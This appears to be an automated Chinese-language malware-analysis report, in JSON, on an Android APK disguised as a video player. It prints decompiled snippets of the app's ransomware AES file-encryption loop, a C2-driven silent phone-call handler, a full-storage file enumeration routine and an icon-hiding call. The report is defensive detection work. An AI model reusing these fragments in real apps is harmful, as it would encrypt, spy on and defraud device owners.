@@ -1,0 +1,150 @@
+{
+  "APK信息": {
+    "文件名": "5bbe9e80288991de75fb7d4f1b2ea3a87cfcbd2a64a3e2b13861535cccecd136.apk",
+    "sha256": "5bbe9e80288991de75fb7d4f1b2ea3a87cfcbd2a64a3e2b13861535cccecd136",
+    "包名": "wcqrucdpzh.otstodvvsm.vrbnjqrsrr",
+    "应用名": "Video Player",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 167.9
+  },
+  "行为列表": [
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lwcqrucdpzh\\otstodvvsm\\vrbnjqrsrr\\i;",
+          "method_signature": "if(Arrays.equals(bArr, i.b)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Cipher cipher = Cipher.getInstance(\"AES/CBC\");\ncipher.init(1, i.c, new IvParameterSpec(i.e));\nBufferedInputStream bufferedInputStream2 = new BufferedInputStream(new FileInputStream(str));\nBufferedOutputStream bufferedOutputStream = new BufferedOutputStream(new CipherOutputStream(new FileOutputStream(str + \".Gdsa21\"), cipher));\nwhile (true) {\n    int i = bufferedInputStream2.read(bArr2);\n    if (i == -1) {\n        break;\n    }\n    bufferedOutputStream.write(bArr2, 0, i);\n}",
+          "malicious_code_snippet_context": "                              }\n                          }\n                          bufferedInputStream.close();\n>>>                         Cipher cipher = Cipher.getInstance(\"AES/CBC\");\n>>>                         cipher.init(1, i.c, new IvParameterSpec(i.e));\n>>>                         byte[] bArr2 = new byte[1024];\n>>>                         BufferedInputStream bufferedInputStream2 = new BufferedInputStream(new FileInputStream(str));\n>>>                         BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(new CipherOutputStream(new FileOutputStream(str + \".Gdsa21\"), cipher));\n>>>                         while (true) {\n>>>                             int i = bufferedInputStream2.read(bArr2);\n>>>                             if (i == -1) {\n>>>                                 break;\n>>>                             }\n>>>                             bufferedOutputStream.write(bArr2, 0, i);\n                          }\n                          bufferedOutputStream.flush();\n                          bufferedInputStream2.close();",
+          "behavior_description": "该代码是典型的勒索软件文件加密逻辑：首先读取文件末尾与内置标记 i.b 等长的字节并用 Arrays.equals 比较（判断文件是否已被加密过，避免重复加密），随后以加密模式（init 第一个参数为 1，即 ENCRYPT_MODE）初始化 AES/CBC 加密器（密钥 i.c、初始向量 i.e），通过 CipherOutputStream 包装输出流，将用户本地文件（FileInputStream 读取的 str 路径文件）按 1024 字节块逐段加密，写入带勒索后缀 \".Gdsa21\" 的新文件中，导致用户文件被加密劫持、无法正常访问，直接造成用户数据损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lwcqrucdpzh\\otstodvvsm\\vrbnjqrsrr\\bevrpuzjnp;",
+          "method_signature": "run()",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "case \"Call\":\n    new Thread(new Runnable() {\n        public void run() {\n            bevrpuzjnp.this.startActivity(new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + jSONObject.getString(\"number\"))).setFlags(268435456));\n        }\n    }).start();",
+          "malicious_code_snippet_context": "                                  break;\n                              }\n                              break;\n>>>                         case \"Call\":\n>>>                             new Thread(new Runnable() { // from class: wcqrucdpzh.otstodvvsm.vrbnjqrsrr.bevrpuzjnp.3\n>>>                                 @Override // java.lang.Runnable\n>>>                                 public void run() {\n>>>                                     try {\n>>>                                         bevrpuzjnp.this.startActivity(new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + jSONObject.getString(\"number\").replace(\"&quots;\", \"\\\"\"))).setFlags(268435456));\n                                      } catch (JSONException unused2) {\n                                      }\n                                  }",
+          "behavior_description": "该代码是一个远程命令分发器（switch处理\"Call\"、\"Deleted\"等指令）。当收到\"Call\"指令时，在新线程中从远程下发的JSON指令中取出\"number\"字段作为电话号码，通过startActivity发起ACTION_CALL意图直接静默拨打电话（非ACTION_DIAL调起拨号界面），无需用户确认。数据流向：远程C2服务器下发的JSON指令→jSONObject.getString(\"number\")→ACTION_CALL Intent→startActivity()静默拨号。攻击者可远程控制受害手机拨打指定号码，用于拨打高额付费号码实施资费消耗欺诈或窃听，直接造成用户经济损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "file_access",
+      "中文名": "文件访问/窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_EXTERNAL_STORAGE",
+          "android.permission.WRITE_EXTERNAL_STORAGE"
+        ],
+        "字符串": [
+          "getExternalStorageDirectory"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lwcqrucdpzh\\otstodvvsm\\vrbnjqrsrr\\btpeionswn;",
+          "method_signature": "onCreate()",
+          "malicious_behavior": "file_access",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "b = ((WifiManager) getApplicationContext().getSystemService(\"wifi\")).createWifiLock(1, getClass().getName());\nb.acquire();\narrayList = k.a(getApplicationInfo().dataDir, \"/\");\narrayList = k.a(getApplicationInfo().dataDir, Environment.getExternalStorageDirectory().getPath());\narrayList = k.a(getApplicationInfo().dataDir, \"/storage/\");\narrayList = k.a(getApplicationInfo().dataDir, \"/sdcard/\");",
+          "malicious_code_snippet_context": "          try {\n              a = ((PowerManager) getSystemService(\"power\")).newWakeLock(1, getClass().getName());\n              a.acquire();\n>>>             b = ((WifiManager) getApplicationContext().getSystemService(\"wifi\")).createWifiLock(1, getClass().getName());\n>>>             b.acquire();\n>>>         } catch (Exception unused) {\n>>>         }\n>>>         try {\n>>>             ArrayList<String> arrayList = new ArrayList<>();\n              try {\n                  try {\n                      arrayList = k.a(getApplicationInfo().dataDir, \"/\");",
+          "behavior_description": "该代码在 onCreate 中首先创建并持有 WifiLock（acquire()），保持设备唤醒与 WiFi 连接不中断，为长时间后台文件扫描/上传做准备；随后调用 k.a() 以应用数据目录为起点，依次尝试递归遍历根目录 \"/\"、外部存储、/storage/、/sdcard/ 等多个路径，构建完整的文件路径列表。这种多级回退的全盘文件枚举行为是典型的文件窃取前奏，收集到的文件列表通常会被后续代码筛选（如文档、图片等）并上传至 C2 服务器，导致用户隐私数据泄露。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lwcqrucdpzh\\otstodvvsm\\vrbnjqrsrr\\sksvnqxsrs;",
+          "method_signature": "a()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "String packageName = getApplicationContext().getPackageName();\ngetApplicationContext().getPackageManager().setComponentEnabledSetting(new ComponentName(packageName, packageName + \".sksvnqxsrs\"), 2, 1);",
+          "malicious_code_snippet_context": "      }\n  \n      private void a() {\n>>>         String packageName = getApplicationContext().getPackageName();\n>>>         getApplicationContext().getPackageManager().setComponentEnabledSetting(new ComponentName(packageName, packageName + \".sksvnqxsrs\"), 2, 1);\n      }\n  \n      private void b() {",
+          "behavior_description": "该 Activity 在 onCreate() 中调用私有方法 a()，通过 getApplicationContext().getPackageName() 获取自身包名（source），构造指向应用自身启动组件（launcher activity 别名 sksvnqxsrs）的 ComponentName，随后调用 PackageManager.setComponentEnabledSetting() 并传入状态值 2（COMPONENT_ENABLED_STATE_DISABLED）和标志 1（DONT_KILL_APP）（sink），禁用应用的桌面入口组件，导致应用图标从启动器中消失。这是恶意软件典型的图标隐藏/自我隐藏技术，使用户无法在桌面找到该应用，难以察觉和卸载，为后续隐蔽恶意行为提供持久化掩护。结合混淆的包名（wcqrucdpzh.otstodvvsm.vrbnjqrsrr.sksvnqxsrs）可确认这是刻意设计的隐蔽手段。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
